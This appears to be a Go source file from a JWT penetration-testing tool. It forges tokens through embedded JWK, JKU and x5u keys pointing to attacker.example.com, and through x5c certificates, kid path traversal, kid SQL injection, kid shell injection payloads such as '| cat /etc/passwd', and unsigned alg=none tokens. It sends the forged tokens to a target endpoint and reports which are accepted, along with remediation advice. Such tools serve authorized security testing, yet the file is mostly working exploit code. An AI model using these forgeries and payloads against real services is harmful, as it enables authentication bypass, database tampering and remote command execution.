package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"strings"
)

// KID path traversal payloads targeting common null/empty key sources.
var kidPathTraversalPayloads = []string{
	"../../../../../../../../dev/null",
	"/dev/null",
	"../../../../../../../../etc/hosts",
	"../../../../../../../../proc/self/environ",
	"....//....//....//....//....//....//....//dev/null",
	"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fdev/null",
	"/proc/sys/kernel/random/uuid", // empty file, returns empty key
	"",
}

// KID SQL injection payloads targeting various DB backends.
var kidSQLInjectionPayloads = []string{
	"' UNION SELECT 'attacker-secret' --",
	"1' OR '1'='1",
	"\" UNION SELECT \"attacker-secret\" --",
	"' UNION SELECT NULL --",
	"1; DROP TABLE keys--",
	"' OR 1=1#",
	"admin'--",
}

// KID command injection payloads.
var kidCommandInjectionPayloads = []string{
	"| id",
	"| whoami",
	";id",
	"$(whoami)",
	"`id`",
	"| cat /etc/passwd",
}

// critHeaderParams contains critical header parameter combinations
// that may bypass validation in lenient parsers.
var critBypassPayloads = [][]map[string]interface{}{
	{{"crit": []string{"alg"}}},
	{{"crit": []string{"alg", "kid"}}},
	{{"crit": []string{"none"}}},
	{{"crit": []string{"jku"}}},
	{{"crit": []string{"x5u"}}},
}

// testHeaderInjection tests all header injection attack vectors.
// Dispatches to specific injection functions based on cfg.InjType.
func testHeaderInjection(cfg *Config) {
	switch cfg.InjType {
	case "jwk":
		testJWKInjection(cfg)
	case "jku":
		testJKUInjection(cfg)
	case "x5c":
		testX5CInjection(cfg)
	case "x5u":
		testX5UInjection(cfg)
	case "kid-traversal":
		testKIDPathTraversal(cfg)
	case "kid-sql":
		testKIDSQLInjection(cfg)
	case "kid-cmd":
		testKIDCommandInjection(cfg)
	case "kid":
		// Run all KID injection types
		testKIDPathTraversal(cfg)
		testKIDSQLInjection(cfg)
		testKIDCommandInjection(cfg)
	case "crit":
		testCritBypass(cfg)
	case "all":
		testJWKInjection(cfg)
		testJKUInjection(cfg)
		testX5CInjection(cfg)
		testX5UInjection(cfg)
		testKIDPathTraversal(cfg)
		testKIDSQLInjection(cfg)
		testKIDCommandInjection(cfg)
		testCritBypass(cfg)
	default:
		log.Fatalf("Unknown injection type: %s. Valid types: jwk, jku, x5c, x5u, kid, kid-traversal, kid-sql, kid-cmd, crit, all", cfg.InjType)
	}
}

// testJWKInjection embeds an attacker-controlled RSA public key (JWK) directly
// into the JWT header. If the server trusts the embedded key for verification,
// the attacker can sign tokens with their own private key.
// Attack vector: CVE-2018-0114 (Node.js node-jose, Cisco ASA, etc.)
func testJWKInjection(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	// Generate attacker RSA key pair
	privKey, err := generateRSAKeyPair(2048)
	if err != nil {
		log.Fatalf("Failed to generate RSA key: %v", err)
	}

	kid := "jwtblast-attacker-key"
	jwk, err := publicKeyToJWK(&privKey.PublicKey, kid)
	if err != nil {
		log.Fatalf("Failed to convert public key to JWK: %v", err)
	}

	// Build forged header with embedded JWK
	headerCopy := copyHeader(header)
	headerCopy["alg"] = "RS256"
	headerCopy["kid"] = kid
	headerCopy["jwk"] = jwk

	forged, err := constructRSAJWTWithRawPayload(headerCopy, payloadB64, privKey)
	if err != nil {
		log.Fatalf("Failed to construct JWK injection token: %v", err)
	}

	report := Report{}
	fmt.Printf("[JWK Injection] Forged token: %s\n", forged)

	if cfg.Endpoint != "" {
		accepted, status, _ := sendTokenAndCheck(cfg, forged)
		if accepted {
			fmt.Printf("[VULNERABLE] JWK injection accepted! Status: %d\n", status)
			addResult(&report, newResult(
				"JWK Header Injection (confirmed)",
				"Header Injection",
				"CRITICAL",
				fmt.Sprintf("Server accepted token with embedded JWK (HTTP %d). "+
					"Attacker can forge tokens with arbitrary claims by embedding their own public key.", status),
			))
			report.Logs = append(report.Logs, "Token: "+forged)
		} else {
			fmt.Printf("[SAFE] JWK injection rejected (status %d)\n", status)
		}
	} else {
		addResult(&report, newResult(
			"JWK Header Injection (offline)",
			"Header Injection",
			"CRITICAL",
			"Generated token with attacker RSA public key embedded as JWK in header. "+
				"If the server uses the embedded key for verification, this token will be accepted.",
		))
		report.Logs = append(report.Logs, forged)
	}

	report.Recommendations = append(report.Recommendations,
		"Never trust JWK keys embedded in token headers",
		"Fetch public keys only from a trusted JWKS endpoint or configuration",
		"Use libraries that ignore 'jwk' header parameter (e.g., PyJWT >= 2.0.0)",
		"Implement key pinning: map kid to a pre-registered key, not to header-provided keys",
	)
	writeReport(cfg.ReportFile, report)
}

// testJKUInjection injects a JKU (JWK Set URL) header pointing to an attacker-controlled
// JWKS endpoint. If the server fetches keys from this URL without validation, the attacker
// can sign tokens with their own private key.
func testJKUInjection(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	jkuURL := cfg.InjValue
	if jkuURL == "" {
		jkuURL = "https://attacker.example.com/.well-known/jwks.json"
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	// Generate attacker RSA key pair
	privKey, err := generateRSAKeyPair(2048)
	if err != nil {
		log.Fatalf("Failed to generate RSA key: %v", err)
	}

	kid := "jwtblast-attacker-key"
	headerCopy := copyHeader(header)
	headerCopy["alg"] = "RS256"
	headerCopy["kid"] = kid
	headerCopy["jku"] = jkuURL

	forged, err := constructRSAJWTWithRawPayload(headerCopy, payloadB64, privKey)
	if err != nil {
		log.Fatalf("Failed to construct JKU injection token: %v", err)
	}

	// Also generate JWKS file for the attacker to host
	jwks, err := createJWKS(&privKey.PublicKey, kid)
	if err != nil {
		log.Fatalf("Failed to create JWKS: %v", err)
	}
	jwksJSON, _ := json.MarshalIndent(jwks, "", "  ")

	report := Report{}
	fmt.Printf("[JKU Injection] Forged token: %s\n", forged)
	fmt.Printf("[JKU Injection] Host this JWKS at %s:\n%s\n", jkuURL, string(jwksJSON))

	if cfg.Endpoint != "" {
		accepted, status, _ := sendTokenAndCheck(cfg, forged)
		if accepted {
			fmt.Printf("[VULNERABLE] JKU injection accepted! Status: %d\n", status)
			addResult(&report, newResult(
				"JKU Header Injection (confirmed)",
				"Header Injection",
				"CRITICAL",
				fmt.Sprintf("Server fetched keys from attacker-controlled JKU URL and accepted the token (HTTP %d). "+
					"Key source is not validated against a whitelist.", status),
			))
			report.Logs = append(report.Logs, "Token: "+forged)
		} else {
			fmt.Printf("[SAFE] JKU injection rejected (status %d)\n", status)
		}
	} else {
		addResult(&report, newResult(
			"JKU Header Injection (offline)",
			"Header Injection",
			"CRITICAL",
			fmt.Sprintf("Generated token with JKU pointing to %s. "+
				"If the server fetches keys from this URL without whitelist validation, this token will be accepted.", jkuURL),
		))
		report.Logs = append(report.Logs, "Token: "+forged)
		report.Logs = append(report.Logs, "JWKS to host: "+string(jwksJSON))
	}

	report.Recommendations = append(report.Recommendations,
		"Whitelist allowed JWKS URLs; never fetch from arbitrary JKU header values",
		"Use HTTPS for all JWKS endpoints and pin certificates",
		"Cache JWKS responses with short TTL to reduce fetch frequency",
		"Log all JWKS fetch attempts for security monitoring",
	)
	writeReport(cfg.ReportFile, report)
}

// testX5CInjection embeds an attacker-controlled X.509 certificate chain (x5c)
// in the JWT header. If the server uses the embedded certificate's public key
// for verification, the attacker can forge tokens.
func testX5CInjection(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	// Generate attacker RSA key pair and self-signed certificate
	privKey, err := generateRSAKeyPair(2048)
	if err != nil {
		log.Fatalf("Failed to generate RSA key: %v", err)
	}

	certBytes, err := generateSelfSignedCert(privKey)
	if err != nil {
		log.Fatalf("Failed to generate self-signed certificate: %v", err)
	}

	certBase64 := base64.StdEncoding.EncodeToString(certBytes)
	kid := "jwtblast-attacker-cert"

	headerCopy := copyHeader(header)
	headerCopy["alg"] = "RS256"
	headerCopy["kid"] = kid
	headerCopy["x5c"] = []string{certBase64}

	forged, err := constructRSAJWTWithRawPayload(headerCopy, payloadB64, privKey)
	if err != nil {
		log.Fatalf("Failed to construct x5c injection token: %v", err)
	}

	report := Report{}
	fmt.Printf("[X5C Injection] Forged token: %s\n", forged)

	if cfg.Endpoint != "" {
		accepted, status, _ := sendTokenAndCheck(cfg, forged)
		if accepted {
			fmt.Printf("[VULNERABLE] X5C injection accepted! Status: %d\n", status)
			addResult(&report, newResult(
				"X5C Header Injection (confirmed)",
				"Header Injection",
				"CRITICAL",
				fmt.Sprintf("Server used certificate from x5c header for verification (HTTP %d). "+
					"Attacker can forge tokens with self-signed certificates.", status),
			))
			report.Logs = append(report.Logs, "Token: "+forged)
		} else {
			fmt.Printf("[SAFE] X5C injection rejected (status %d)\n", status)
		}
	} else {
		addResult(&report, newResult(
			"X5C Header Injection (offline)",
			"Header Injection",
			"CRITICAL",
			"Generated token with attacker self-signed X.509 certificate embedded in x5c header. "+
				"If the server extracts the public key from x5c for verification, this token will be accepted.",
		))
		report.Logs = append(report.Logs, "Token: "+forged)
	}

	report.Recommendations = append(report.Recommendations,
		"Never use x5c header for key extraction; use a pre-registered key store",
		"Validate certificate chain against a trusted CA if x5c must be used",
		"Ignore x5c header and resolve keys only via kid + trusted JWKS",
	)
	writeReport(cfg.ReportFile, report)
}

// testX5UInjection injects an x5u (X.509 URL) header pointing to an attacker-controlled
// certificate endpoint. Similar to JKU but for X.509 certificates.
func testX5UInjection(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	x5uURL := cfg.InjValue
	if x5uURL == "" {
		x5uURL = "https://attacker.example.com/.well-known/cert.pem"
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	// Generate attacker RSA key pair
	privKey, err := generateRSAKeyPair(2048)
	if err != nil {
		log.Fatalf("Failed to generate RSA key: %v", err)
	}

	certBytes, err := generateSelfSignedCert(privKey)
	if err != nil {
		log.Fatalf("Failed to generate self-signed certificate: %v", err)
	}

	pemCert := base64.StdEncoding.EncodeToString(certBytes)

	kid := "jwtblast-attacker-cert"
	headerCopy := copyHeader(header)
	headerCopy["alg"] = "RS256"
	headerCopy["kid"] = kid
	headerCopy["x5u"] = x5uURL

	forged, err := constructRSAJWTWithRawPayload(headerCopy, payloadB64, privKey)
	if err != nil {
		log.Fatalf("Failed to construct x5u injection token: %v", err)
	}

	report := Report{}
	fmt.Printf("[X5U Injection] Forged token: %s\n", forged)
	fmt.Printf("[X5U Injection] Host this DER certificate at %s:\n%s\n", x5uURL, pemCert)

	if cfg.Endpoint != "" {
		accepted, status, _ := sendTokenAndCheck(cfg, forged)
		if accepted {
			fmt.Printf("[VULNERABLE] X5U injection accepted! Status: %d\n", status)
			addResult(&report, newResult(
				"X5U Header Injection (confirmed)",
				"Header Injection",
				"CRITICAL",
				fmt.Sprintf("Server fetched certificate from attacker-controlled x5u URL (HTTP %d). "+
					"Key source URL is not validated.", status),
			))
			report.Logs = append(report.Logs, "Token: "+forged)
		} else {
			fmt.Printf("[SAFE] X5U injection rejected (status %d)\n", status)
		}
	} else {
		addResult(&report, newResult(
			"X5U Header Injection (offline)",
			"Header Injection",
			"CRITICAL",
			fmt.Sprintf("Generated token with x5u pointing to %s. "+
				"If the server fetches certificates from this URL without validation, this token will be accepted.", x5uURL),
		))
		report.Logs = append(report.Logs, "Token: "+forged)
	}

	report.Recommendations = append(report.Recommendations,
		"Whitelist allowed x5u URLs; never fetch certificates from arbitrary header values",
		"Use HTTPS for all certificate endpoints and pin certificates",
		"Prefer pre-registered keys over dynamic key fetch from token headers",
	)
	writeReport(cfg.ReportFile, report)
}

// testKIDPathTraversal tests KID header injection with path traversal payloads.
// If the server uses the KID value to construct a file path for key lookup,
// path traversal can force the server to use an empty or attacker-controlled file as the key.
func testKIDPathTraversal(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	report := Report{}
	found := false

	for _, payload := range kidPathTraversalPayloads {
		headerCopy := copyHeader(header)
		headerCopy["alg"] = "HS256"
		headerCopy["kid"] = payload

		// For /dev/null and empty file targets, the key is empty bytes
		// For other targets, we try common empty-content keys
		var key []byte
		if strings.Contains(payload, "/dev/null") || strings.Contains(payload, "random/uuid") || payload == "" {
			key = []byte("")
		} else {
			// Try empty string as fallback
			key = []byte("")
		}

		forged, err := constructHmacJWTWithRawPayload(headerCopy, payloadB64, key, "HS256")
		if err != nil {
			continue
		}

		displayPayload := strings.ReplaceAll(payload, "\x00", "\\x00")

		if cfg.Endpoint != "" {
			accepted, status, _ := sendTokenAndCheck(cfg, forged)
			if accepted {
				fmt.Printf("[VULNERABLE] KID path traversal accepted (kid=%s)! Status: %d\n", displayPayload, status)
				addResult(&report, newResult(
					fmt.Sprintf("KID Path Traversal (confirmed: %s)", displayPayload),
					"Header Injection",
					"CRITICAL",
					fmt.Sprintf("Server used kid value '%s' to load key from filesystem and accepted "+
						"the resulting empty-key HMAC token (HTTP %d).", displayPayload, status),
				))
				report.Logs = append(report.Logs, "Token: "+forged)
				found = true
				break
			} else {
				fmt.Printf("[SAFE] KID traversal rejected (kid=%s, status %d)\n", displayPayload, status)
			}
		} else {
			fmt.Printf("[KID Traversal] kid=%s -> %s\n", displayPayload, forged)
			addResult(&report, newResult(
				fmt.Sprintf("KID Path Traversal (offline: %s)", displayPayload),
				"Header Injection",
				"HIGH",
				fmt.Sprintf("Generated token with kid='%s'. If the server constructs key file path "+
					"from kid value without sanitization, this may force empty-key HMAC verification.", displayPayload),
			))
			report.Logs = append(report.Logs, "kid="+displayPayload+" -> "+forged)
			found = true
		}
	}

	if !found && cfg.Endpoint != "" {
		addResult(&report, newResult(
			"KID Path Traversal (not vulnerable)",
			"Header Injection",
			"INFO",
			"All KID path traversal payloads were rejected by the server",
		))
	}

	report.Recommendations = append(report.Recommendations,
		"Sanitize KID value: use allowlist of characters [a-zA-Z0-9_-]",
		"Never construct file paths directly from KID header value",
		"Map KID to a pre-registered key via internal lookup table, not filesystem path",
		"Use a constant-time key lookup that does not reveal file existence",
	)
	writeReport(cfg.ReportFile, report)
}

// testKIDSQLInjection tests KID header injection with SQL injection payloads.
// If the server uses KID in a database query to look up the signing key,
// SQL injection can exfiltrate or replace the key.
func testKIDSQLInjection(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	report := Report{}
	found := false

	for _, payload := range kidSQLInjectionPayloads {
		headerCopy := copyHeader(header)
		headerCopy["alg"] = "HS256"
		headerCopy["kid"] = payload

		// Sign with the key that the UNION SELECT would return
		attackerSecret := "attacker-secret"
		forged, err := constructHmacJWTWithRawPayload(headerCopy, payloadB64, []byte(attackerSecret), "HS256")
		if err != nil {
			continue
		}

		if cfg.Endpoint != "" {
			accepted, status, _ := sendTokenAndCheck(cfg, forged)
			if accepted {
				fmt.Printf("[VULNERABLE] KID SQL injection accepted (kid=%s)! Status: %d\n", payload, status)
				addResult(&report, newResult(
					fmt.Sprintf("KID SQL Injection (confirmed: %s)", payload),
					"Header Injection",
					"CRITICAL",
					fmt.Sprintf("Server is vulnerable to SQL injection via kid header (HTTP %d). "+
						"Attacker can control the verification key.", status),
				))
				report.Logs = append(report.Logs, "Token: "+forged)
				found = true
				break
			} else {
				fmt.Printf("[SAFE] KID SQL injection rejected (kid=%s, status %d)\n", payload, status)
			}
		} else {
			fmt.Printf("[KID SQLi] kid=%s -> %s\n", payload, forged)
			addResult(&report, newResult(
				fmt.Sprintf("KID SQL Injection (offline: %s)", payload),
				"Header Injection",
				"HIGH",
				fmt.Sprintf("Generated token with SQL injection payload kid='%s'. "+
					"If the server uses kid in a database query without parameterization, "+
					"this may allow key replacement via UNION SELECT.", payload),
			))
			report.Logs = append(report.Logs, "kid="+payload+" -> "+forged)
			found = true
		}
	}

	if !found && cfg.Endpoint != "" {
		addResult(&report, newResult(
			"KID SQL Injection (not vulnerable)",
			"Header Injection",
			"INFO",
			"All KID SQL injection payloads were rejected by the server",
		))
	}

	report.Recommendations = append(report.Recommendations,
		"Use parameterized queries / prepared statements for all database operations",
		"Input-validate KID against a strict allowlist pattern",
		"Use an ORM or query builder that automatically parameterizes inputs",
		"Apply least-privilege database user permissions (no DROP, no UNION on production tables)",
	)
	writeReport(cfg.ReportFile, report)
}

// testKIDCommandInjection tests KID header injection with OS command injection payloads.
// If the server passes KID to a shell command (e.g., for key generation or lookup),
// command injection can lead to RCE.
func testKIDCommandInjection(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	report := Report{}
	found := false

	for _, payload := range kidCommandInjectionPayloads {
		headerCopy := copyHeader(header)
		headerCopy["alg"] = "HS256"
		headerCopy["kid"] = payload

		// For command injection, the key doesn't matter for the payload itself;
		// the attack is about the side-effect of the command execution.
		// We sign with an empty key since the actual attack is via the kid value.
		forged, err := constructHmacJWTWithRawPayload(headerCopy, payloadB64, []byte(""), "HS256")
		if err != nil {
			continue
		}

		if cfg.Endpoint != "" {
			accepted, status, body := sendTokenAndCheck(cfg, forged)
			// Even if the token is rejected, check if the command was executed
			// by looking for telltale signs in the response or timing
			if accepted {
				fmt.Printf("[POTENTIALLY VULNERABLE] KID command injection: token accepted (kid=%s)!\n", payload)
				addResult(&report, newResult(
					fmt.Sprintf("KID Command Injection (confirmed: %s)", payload),
					"Header Injection",
					"CRITICAL",
					fmt.Sprintf("Server accepted token with command injection payload in kid='%s' (HTTP %d). "+
						"This may indicate command execution.", payload, status),
				))
				report.Logs = append(report.Logs, "Token: "+forged)
				found = true
			} else {
				// Check response body for command output
				if containsCommandOutput(body) {
					fmt.Printf("[VULNERABLE] KID command injection detected in response (kid=%s)!\n", payload)
					addResult(&report, newResult(
						fmt.Sprintf("KID Command Injection (confirmed via response: %s)", payload),
						"Header Injection",
						"CRITICAL",
						fmt.Sprintf("Command output detected in server response when kid='%s' was sent. "+
							"OS command injection via kid header is likely.", payload),
					))
					report.Logs = append(report.Logs, "kid="+payload+" | Response: "+body[:min(200, len(body))])
					found = true
					break
				}
				fmt.Printf("[SAFE] KID command injection rejected (kid=%s, status %d)\n", payload, status)
			}
		} else {
			fmt.Printf("[KID CmdInj] kid=%s -> %s\n", payload, forged)
			addResult(&report, newResult(
				fmt.Sprintf("KID Command Injection (offline: %s)", payload),
				"Header Injection",
				"HIGH",
				fmt.Sprintf("Generated token with command injection payload kid='%s'. "+
					"If the server passes kid to a shell command, this may cause RCE.", payload),
			))
			report.Logs = append(report.Logs, "kid="+payload+" -> "+forged)
			found = true
		}
	}

	if !found && cfg.Endpoint != "" {
		addResult(&report, newResult(
			"KID Command Injection (not vulnerable)",
			"Header Injection",
			"INFO",
			"No command execution detected via KID header injection",
		))
	}

	report.Recommendations = append(report.Recommendations,
		"Never pass KID or any header value to shell commands or exec()",
		"Use internal key lookup tables, not OS-level operations",
		"Input-validate KID against [a-zA-Z0-9_-] pattern",
		"Run the application with minimal OS privileges (non-root, restricted shell)",
	)
	writeReport(cfg.ReportFile, report)
}

// testCritBypass tests the "crit" (critical) header parameter bypass.
// The crit header indicates which header parameters must be understood and
// processed by the receiver. Malformed crit headers may cause some parsers
// to skip validation entirely.
func testCritBypass(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, _, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	payloadB64, err := getPayloadBase64(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract payload: %v", err)
	}

	report := Report{}
	found := false

	for _, critParams := range critBypassPayloads {
		headerCopy := copyHeader(header)
		for _, params := range critParams {
			for k, v := range params {
				headerCopy[k] = v
			}
		}

		// Try with alg=none first (most likely to succeed with crit bypass)
		headerCopy["alg"] = "none"
		headerEnc, err := encodeTokenPart(headerCopy)
		if err != nil {
			continue
		}
		forged := headerEnc + "." + payloadB64 + "."

		critDesc := fmt.Sprintf("%v", critParams)

		if cfg.Endpoint != "" {
			accepted, status, _ := sendTokenAndCheck(cfg, forged)
			if accepted {
				fmt.Printf("[VULNERABLE] crit header bypass accepted! Params: %s, Status: %d\n", critDesc, status)
				addResult(&report, newResult(
					fmt.Sprintf("Critical Header Bypass (confirmed: %s)", critDesc),
					"Header Injection",
					"HIGH",
					fmt.Sprintf("Server accepted unsigned token with crit header %s (HTTP %d). "+
						"Critical header processing may disable algorithm validation.", critDesc, status),
				))
				report.Logs = append(report.Logs, "Token: "+forged)
				found = true
				break
			} else {
				fmt.Printf("[SAFE] crit bypass rejected (params: %s, status %d)\n", critDesc, status)
			}
		} else {
			fmt.Printf("[crit Bypass] %s -> %s\n", critDesc, forged)
			addResult(&report, newResult(
				fmt.Sprintf("Critical Header Bypass (offline: %s)", critDesc),
				"Header Injection",
				"MEDIUM",
				fmt.Sprintf("Generated unsigned token with crit header %s. "+
					"Some parsers may skip algorithm validation when crit headers are present.", critDesc),
			))
			report.Logs = append(report.Logs, forged)
			found = true
		}
	}

	if !found && cfg.Endpoint != "" {
		addResult(&report, newResult(
			"Critical Header Bypass (not vulnerable)",
			"Header Injection",
			"INFO",
			"All crit header bypass payloads were rejected by the server",
		))
	}

	report.Recommendations = append(report.Recommendations,
		"Process crit header per RFC 7515 Section 4.1.11: reject tokens with unknown critical parameters",
		"Validate all critical parameters before processing the token",
		"Do not use crit header to control algorithm selection",
	)
	writeReport(cfg.ReportFile, report)
}

// copyHeader creates a shallow copy of a JWT header map.
func copyHeader(src map[string]interface{}) map[string]interface{} {
	dst := make(map[string]interface{})
	for k, v := range src {
		dst[k] = v
	}
	return dst
}

// containsCommandOutput checks if the response body contains output
// typical of OS command execution (uid, gid, hostname, /etc/passwd entries).
func containsCommandOutput(body string) bool {
	indicators := []string{
		"uid=", "gid=", "groups=",
		"root:x:0:0:", "/bin/",
		"Linux", "Darwin",
		"whoami", "id",
		"uid_0", "uid=0",
	}
	lowerBody := strings.ToLower(body)
	for _, ind := range indicators {
		if strings.Contains(lowerBody, strings.ToLower(ind)) {
			return true
		}
	}
	return false
}
